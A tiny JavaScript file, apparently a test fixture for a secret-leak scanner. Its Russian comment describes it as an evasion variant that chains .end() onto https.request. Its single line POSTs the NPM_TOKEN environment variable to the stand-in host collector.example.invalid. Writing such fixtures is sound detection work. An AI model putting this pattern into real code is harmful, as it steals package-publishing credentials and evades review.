// Обход: тело уходит в тот же https.request, что и в req-write.js, но без переменной
// запроса — цепочкой .end(...) сразу после вызова. В опциях запроса секрета нет.
const https = require('https');
https.request({ hostname: 'collector.example.invalid', path: '/c', method: 'POST' }).end(process.env.NPM_TOKEN);
